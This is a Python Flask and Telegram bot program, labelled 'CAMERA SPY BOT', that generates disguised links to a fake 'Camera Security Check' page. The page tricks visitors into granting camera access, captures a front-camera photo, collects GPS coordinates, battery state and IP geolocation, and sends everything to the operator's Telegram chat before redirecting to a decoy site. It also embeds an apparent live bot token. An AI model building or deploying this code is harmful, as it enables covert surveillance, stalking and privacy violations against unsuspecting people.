from flask import Flask, request, send_file, Response
import requests
import threading
import time
import os
from datetime import datetime
import base64
from urllib.parse import quote
from PIL import Image
import io

app = Flask(__name__)

BOT_TOKEN = "8642610739:AAEH6UaaiPA6lzUjwZXpWcZU8QtPz4et3Jo"
ADMIN_ID = 8559153464
BASE_URL = ""

def get_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    return ip.split(',')[0].strip() if ',' in ip else ip

def send_telegram(msg, photo_path=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto" if photo_path else f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    if photo_path:
        with open(photo_path, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': ADMIN_ID, 'caption': msg}
            requests.post(url, files=files, data=data)
        os.remove(photo_path)  # Cleanup
    else:
        data = {'chat_id': ADMIN_ID, 'text': msg, 'parse_mode': 'Markdown'}
        requests.post(url, data=data)

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=city,regionName,country,isp,lat,lon", timeout=3)
        return r.json()
    except:
        return {}

def save_photo(base64_data, sid):
    try:
        # Decode base64 image
        image_data = base64.b64decode(base64_data.split(',')[1])
        img = Image.open(io.BytesIO(image_data))
        
        # Save with timestamp
        filename = f"photo_{sid}_{int(time.time())}.jpg"
        filepath = os.path.join("photos", filename)
        os.makedirs("photos", exist_ok=True)
        
        img.save(filepath, "JPEG", quality=85)
        return filepath
    except:
        return None

@app.route('/', methods=['GET'])
def tracker():
    global BASE_URL
    if not BASE_URL:
        BASE_URL = f"https://{request.host}"
    
    target = request.args.get('url', 'https://google.com')
    sid = base64.b64encode(os.urandom(8)).decode()[:8]
    
    html = f"""
<!DOCTYPE html>
<html>
<head>
<title>Camera Permission</title>
<meta http-equiv="refresh" content="3;url={target}">
<style>
body {{background:black;color:lime;font-family:monospace;margin:0;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column}}
.camera-container {{text-align:center;margin:20px}}
#video {{width:300px;height:225px;border:2px solid lime;background:black}}
#capture {{background:lime;color:black;padding:10px 20px;border:none;font-size:16px;cursor:pointer;margin:10px}}
h1 {{font-size:3em;animation:pulse 1s infinite}}
@keyframes pulse {{0%,100%{{opacity:1}}50%{{opacity:0.5}}}}
</style>
</head>
<body>
<h1>📸 Camera Security Check</h1>
<div class="camera-container">
<video id="video" autoplay muted playsinline></video><br>
<button id="capture">📸 Take Photo</button>
</div>

<script>
const video = document.getElementById('video');
const capture = document.getElementById('capture');
let stream = null;
let sid = '{sid}';

// Front Camera Access
navigator.mediaDevices.getUserMedia({{
  video: {{facingMode: 'user', width: 640, height: 480}}
}}).then(s => {{
  stream = s;
  video.srcObject = stream;
}}).catch(e => {{
  console.log('Camera access denied');
}});

// Capture Photo
capture.onclick = function() {{
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0);
  
  // Send Photo
  fetch('{BASE_URL}/camera', {{
    method: 'POST',
    body: JSON.stringify({{
      image: canvas.toDataURL('image/jpeg', 0.8),
      sid: sid
    }})
  }});
  
  // GPS
  navigator.geolocation.getCurrentPosition(p => {{
    fetch('{BASE_URL}/gps?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&sid='+sid)
  }});
  
  // Battery
  if(navigator.getBattery) {{
    navigator.getBattery().then(b => {{
      fetch('{BASE_URL}/battery?level='+b.level+'&charging='+b.charging+'&sid='+sid)
    }});
  }}
}};
</script>
</body>
</html>
    """
    return html

@app.route('/camera', methods=['POST'])
def camera_capture():
    try:
        data = request.get_json()
        sid = data['sid']
        photo_path = save_photo(data['image'], sid)
        
        ip = get_ip()
        geo = get_geo(ip)
        
        msg = f"""
📸 **FRONT CAMERA PHOTO CAPTURED!** 📸

🔗 **Session**: `{sid}`
🌐 **IP**: `{ip}`
📍 **Location**: {geo.get('city', '')}, {geo.get('country', '')}

✅ **PHOTO SAVED + SENT**
📱 **Camera Access**: GRANTED
        """
        
        send_telegram(msg, photo_path)
        return "PHOTO CAPTURED"
    except:
        return "ERROR"

@app.route('/gps')
@app.route('/battery')
def sensors():
    ip = get_ip()
    geo = get_geo(ip)
    sid = request.args.get('sid', 'unknown')
    
    msg = f"""
🕵️ **SENSOR DATA** `{sid}`

🌐 **IP**: `{ip}`
📍 **GPS**: {request.args.get('lat')}, {request.args.get('lon')}
🔋 **Battery**: {request.args.get('level', 0)*100:.0f}% ({'Charging' if request.args.get('charging')=='true' else 'Not'})
📡 **ISP**: {geo.get('isp', 'Unknown')}

⏰ **{datetime.now().strftime('%H:%M:%S')}**
        """
    
    send_telegram(msg)
    return "OK"

# Telegram Bot
def telegram_bot():
    import telegram
    from telegram.ext import Application, CommandHandler, MessageHandler, filters
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    async def start(update, context):
        if update.message.from_user.id != ADMIN_ID: return
        link = f"{BASE_URL}/?url=https://google.com"
        await update.message.reply_text(
            f"📸 **CAMERA SPY BOT**\n\n"
            f"🔗 **Link**: `{link}`\n\n"
            f"✅ **Captures**:\n"
            f"• Front Camera Photo 📸\n"
            f"• GPS Location 📍\n"
            f"• Battery Status 🔋\n"
            f"• Device Info 📱\n\n"
            f"👇 Send URL for custom target",
            parse_mode='Markdown'
        )
    
    async def url_handler(update, context):
        if update.message.from_user.id != ADMIN_ID: return
        url = update.message.text.strip()
        if 'http' in url:
            track_url = f"{BASE_URL}/?url={quote(url)}"
            await update.message.reply_text(f"🎥 **Camera Trap Ready**:\n`{track_url}`", parse_mode='Markdown')
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, url_handler))
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    # Create photos folder
    os.makedirs("photos", exist_ok=True)
    
    # Start bot thread
    threading.Thread(target=telegram_bot, daemon=True).start()
    
    port = int(os.environ.get('PORT', 5000))
    print(f"📸 Camera Bot: http://0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port)